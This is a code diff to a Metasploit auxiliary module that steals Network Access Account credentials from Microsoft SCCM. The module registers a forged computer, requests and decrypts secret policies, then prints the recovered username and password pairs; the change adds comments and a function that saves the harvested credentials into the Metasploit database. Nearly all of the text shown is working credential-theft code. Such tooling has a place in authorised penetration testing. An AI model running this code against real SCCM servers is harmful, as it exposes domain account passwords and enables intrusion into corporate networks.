@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Get NAA Credentials',
         'Description' => %q{
-          This module attempts to retrieve the Network Access Account, if configured, from the SCCM server.
+          This module attempts to retrieve the Network Access Account(s), if configured, from the SCCM server.
           This requires a computer account, which can be added using the samr_account module.
         },
         'Author' => [
@@ -132,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     }
 
-    sms_id = register_request(http_opts, management_point, key, cert)
+    sms_id, ip_address = register_request(http_opts, management_point, key, cert)
     duration = 5
     print_status("Waiting #{duration} seconds for SCCM DB to update...")
 
@@ -151,12 +151,14 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     all_results.each do |username, password|
+      report_creds(ip_address, username, password)
       print_good("Found valid NAA credentials: #{username}:#{password}")
     end
   rescue SocketError => e
     fail_with(Failure::Unreachable, e.message)
   end
 
+  # Request the policy from the policy_url
   def request_policy(http_opts, policy_url, sms_id, key)
     policy_url.gsub!(%r{^https?://<mp>}, '')
     policy_url = policy_url.gsub('{', '%7B').gsub('}', '%7D')
@@ -229,6 +231,7 @@ class MetasploitModule < Msf::Auxiliary
     decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
   end
 
+  # Retrieve all the policies with secret components in them
   def get_secret_policies(http_opts, management_point, site_code, key, cert, sms_id)
     computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
     fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
@@ -287,6 +290,7 @@ class MetasploitModule < Msf::Auxiliary
     urls
   end
 
+  # Sign the data using the RSA key, and reverse it (strange, but it's what's required)
   def rsa_sign(key, data)
     signature = key.sign(OpenSSL::Digest.new('SHA256'), data)
     signature.reverse!
@@ -294,8 +298,8 @@ class MetasploitModule < Msf::Auxiliary
     signature.unpack('H*')[0].upcase
   end
 
+  # Make a pubkey structure (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb)
   def make_ms_pubkey(pub_key)
-    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
     result = "\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31"
     result += [KEY_SIZE, pub_key.e].pack('II')
     result += [pub_key.n.to_s(16)].pack('H*')
@@ -303,6 +307,7 @@ class MetasploitModule < Msf::Auxiliary
     result.unpack('H*')[0]
   end
 
+  # Make a request to the SCCM server to register our computer
   def register_request(http_opts, management_point, key, cert)
     pub_key = cert.to_der.unpack('H*')[0].upcase
 
@@ -340,6 +345,7 @@ class MetasploitModule < Msf::Auxiliary
     if http_response.nil?
       fail_with(Failure::Unreachable, 'No response from server')
     end
+    ip_address = http_response.peerinfo['addr']
     response = Rex::MIME::Message.new(http_response.to_s)
     if response.parts.empty?
       html_doc = Nokogiri::HTML(http_response.to_s)
@@ -365,9 +371,10 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_status("Got SMS ID: #{sms_id}")
 
-    sms_id
+    [sms_id, ip_address]
   end
 
+  # Extract obfuscated credentials from the resulting policy XML document
   def get_creds_from_policy_doc(policy)
     xml_doc = Nokogiri::XML(policy)
     naa_sections = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
@@ -428,6 +435,7 @@ class MetasploitModule < Msf::Auxiliary
     hash1 + hash2[0..3]
   end
 
+  ## Create a self-signed private key and certificate for our computer registration
   def generate_key_and_cert(subject)
     key = OpenSSL::PKey::RSA.new(KEY_SIZE)
     cert = OpenSSL::X509::Certificate.new
@@ -449,5 +457,34 @@ class MetasploitModule < Msf::Auxiliary
     cert.sign(key, OpenSSL::Digest.new('SHA256'))
 
     [key, cert]
+  end
+
+  def report_creds(ip_address, user, password)
+    service_data = {
+      address: ip_address,
+      port: rport,
+      protocol: 'tcp',
+      service_name: 'sccm',
+      workspace_id: myworkspace_id
+    }
+
+    domain, account = user.split(/\\/)
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: account,
+      private_data: password,
+      private_type: :password,
+      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+      realm_value: domain
+    }
+    credential_core = create_credential(credential_data.merge(service_data))
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
+
+    create_credential_login(login_data.merge(service_data))
   end
 end
